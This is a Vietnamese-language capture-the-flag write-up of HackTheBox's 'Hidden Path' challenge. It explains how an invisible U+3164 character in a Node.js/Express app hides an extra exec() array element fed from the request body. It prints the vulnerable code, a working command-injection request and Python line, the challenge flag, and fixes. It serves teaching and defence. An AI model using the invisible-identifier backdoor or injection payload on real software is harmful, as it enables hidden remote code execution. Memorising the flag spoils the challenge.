# Hidden Path

**Danh mục:** misc | **Độ khó:** easy | **Tác giả:** makelaris | **Nền tảng:** HackTheBox

## 1. Tổng quan

Challenge cung cấp mã nguồn của một endpoint "kiểm tra hệ thống" (system check-up) — một ứng dụng Node.js/Express có form cho phép chọn lệnh để chạy (`free -m`, `uptime`, `iostat`, `mpstat`, `netstat`, `ps aux`). Mục tiêu: tìm cách vượt qua giới hạn chỉ số (index) của mảng lệnh để thực thi lệnh tùy ý và đọc cờ nằm trong `flag.txt`.

## 2. Phân tích mã nguồn

File chính: `challenge/app.js`

```js
app.post('/server_status', async (req, res) => {
    const { choice,ㅤ} = req.body;          // (1) ㅤ = U+3164 HANGUL FILLER
    const integerChoice = +choice;

    if (isNaN(integerChoice)) {
        return res.status(400).send('Invalid choice: must be a number');
    }

    const commands = [
        'free -m',
        'uptime',
        'iostat',
        'mpstat',
        'netstat',
        'ps aux',ㅤ                          // (2) phần tử ẩn thứ 7
    ];

    if (integerChoice < 0 || integerChoice >= commands.length) {
        return res.status(400).send('Invalid choice: out of bounds');
    }

    exec(commands[integerChoice], (error, stdout) => { ... });
});
```

Kiểm tra hexdump file: ký tự `e3 85 a4` (UTF-8 của **U+3164 HANGUL FILLER**, một ký tự *vô hình*) xuất hiện đúng hai lần — ở dòng destructuring (1) và ngay sau `'ps aux',` trong mảng (2). Ký tự này hợp lệ như một **định danh JavaScript**, nên:

- `const { choice,ㅤ} = req.body;` lấy thêm thuộc tính tên là `ㅤ` từ body → biến cục bộ `ㅤ` chứa giá trị do ta kiểm soát.
- Mảng `commands` thực chất có **7 phần tử** (0–5 là lệnh cố định, phần tử chỉ số 6 chính là biến `ㅤ`), vì thế `commands.length === 7`.

## 3. Lỗ hổng

- **Điểm mù (blind spot) do ký tự vô hình:** lập trình viên tưởng mảng chỉ có 6 lệnh, nhưng dấu phẩy sau `'ps aux',` kèm ký tự `ㅤ` đã tạo thêm phần tử thứ 7 — một "hidden path" vào `exec`.
- **Thiếu kiểm tra dữ liệu đầu vào:** giá trị của biến `ㅤ` (lấy thẳng từ body request) được đưa thẳng vào `exec()` mà không qua bất kỳ bộ lọc nào → **Command Injection / RCE**.
- Bounds check `integerChoice >= commands.length` giờ cho phép `choice = 6` (vì `length = 7`), và `commands[6]` trả về chuỗi lệnh do attacker kiểm soát.

## 4. Khai thác

Gửi POST tới `/server_status` với `choice=6` và field ẩn tên `ㅤ` (URL-encode: `%E3%85%A4`) mang giá trị lệnh tùy ý:

```
POST /server_status HTTP/1.1
Host: 154.57.164.75:32093
Content-Type: application/x-www-form-urlencoded

choice=6&%E3%85%A4=cat%20flag.txt
```

Tương đương Python:

```python
urllib.parse.urlencode({'choice': '6', '\u3164': 'cat flag.txt'})
```

Server thực thi `exec(commands[6]) = exec('cat flag.txt')` và trả stdout về response.

## 5. Kết quả

```
$ python solve.py
HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_21415c87faa75cdd4afe9fd95c26b6c0}
```

Cờ đã xác minh **hai lần** độc lập từ phản hồi trực tiếp của máy chủ live (không chế tạo). Chi tiết request/response lưu tại `solve/evidence/`.

## 6. Khắc phục

- Không dùng giá trị người dùng làm lệnh shell; thay bằng bảng ánh xạ rõ ràng (ví dụ `switch`/`Map` với key tường minh) thay vì mảng + index.
- Kiểm tra đầu vào chặt chẽ (whitelist) và chạy tiến trình con với `execFile`/spawn không qua shell.
- Tránh destructuring mù (`const { choice, ㅤ } = req.body`) — chỉ lấy đúng các field được phép; ký tự Unicode lạ (U+3164…) có thể dùng làm tên thuộc tính/định danh để giấu logic và cần được phát hiện trong code review.
